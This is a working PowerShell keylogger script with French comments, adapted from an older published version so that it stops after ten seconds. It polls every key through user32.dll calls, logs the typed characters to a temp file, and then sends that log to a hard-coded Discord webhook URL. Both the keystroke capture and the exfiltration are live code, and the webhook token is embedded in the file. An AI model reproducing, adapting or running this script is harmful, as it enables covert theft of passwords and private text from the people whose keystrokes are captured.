<#
PowerShell keystroke logger by shima
http://vacmf.org/2013/01/23/powershell-keylogger/
Modifié : arrêt automatique après 10 secondes
#>

function KeyLog {
    
    $MAPVK_VK_TO_VSC = 0x00
    $MAPVK_VSC_TO_VK = 0x01
    $MAPVK_VK_TO_CHAR = 0x02
    $MAPVK_VSC_TO_VK_EX = 0x03
    $MAPVK_VK_TO_VSC_EX = 0x04
    
    $virtualkc_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 
'@

    $kbstate_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
'@

    $mapchar_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
'@

    $tounicode_sig = @'
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

    $getKeyState = Add-Type -MemberDefinition $virtualkc_sig -name "Win32GetState" -namespace Win32Functions -passThru
    $getKBState = Add-Type -MemberDefinition $kbstate_sig -name "Win32MyGetKeyboardState" -namespace Win32Functions -passThru
    $getKey = Add-Type -MemberDefinition $mapchar_sig -name "Win32MyMapVirtualKey" -namespace Win32Functions -passThru
    $getUnicode = Add-Type -MemberDefinition $tounicode_sig -name "Win32MyToUnicode" -namespace Win32Functions -passThru

    # 📍 AJOUT : Variables pour l'arrêt automatique
    $startTime = Get-Date
    $duration = 10  # Durée en secondes

    Write-Host "⏱️  KeyLogger démarré - Arrêt automatique dans $duration secondes..." -ForegroundColor Green

    while ($true) {
        # 📍 AJOUT : Vérifier si 10 secondes sont écoulées
        $elapsedTime = (Get-Date) - $startTime
        if ($elapsedTime.TotalSeconds -ge $duration) {
            Write-Host "`n⏹️  KeyLogger arrêté après $duration secondes" -ForegroundColor Red
            break  # Arrête la boucle
        }

        Start-Sleep -Milliseconds 40
        $gotit = ""
        
        for ($char = 1; $char -le 254; $char++) {
            $vkey = $char
            $gotit = $getKeyState::GetAsyncKeyState($vkey)
            
            if ($gotit -eq -32767) {
            
                $l_shift = $getKeyState::GetAsyncKeyState(160)
                $r_shift = $getKeyState::GetAsyncKeyState(161)
                $caps_lock = [console]::CapsLock
                
                $scancode = $getKey::MapVirtualKey($vkey, $MAPVK_VSC_TO_VK_EX)
                
                $kbstate = New-Object Byte[] 256
                $checkkbstate = $getKBState::GetKeyboardState($kbstate)
                
                $mychar = New-Object -TypeName "System.Text.StringBuilder"
                $unicode_res = $getUnicode::ToUnicode($vkey, $scancode, $kbstate, $mychar, $mychar.Capacity, 0)
                
                if ($unicode_res -gt 0) {
                    $logfile = "$env:temp\key.log"
                    Out-File -FilePath $logfile -Encoding Unicode -Append -InputObject $mychar.ToString()
                }
            }
        }
    }
}

# 📍 AJOUT : Afficher le fichier log après l'arrêt
KeyLog
$logfile = "$env:temp\key.log"
Write-Host "`n📄 Contenu du fichier log :" -ForegroundColor Yellow
Write-Host "Fichier sauvegardé à : $logfile" -ForegroundColor Cyan
if (Test-Path $logfile) {
    Get-Content $logfile
} else {
    Write-Host "Aucune touche enregistrée." -ForegroundColor Gray
}

Start-Sleep -Seconds 3

$webhook = "https://discord.com/api/webhooks/1197260699768987748/MusyfmoPCs0DkrWb1IH2uQ0Aw6p369foF6pVYynOxL5x0wYokip9_a-kkhpbhWVATEHn"
$contenu = Get-Content "C:\Users\Hugo\AppData\Local\Temp\key.log" -Raw
Invoke-RestMethod -Uri $webhook -Method Post -Body (@{content=$contenu} | ConvertTo-Json) -ContentType "application/json"
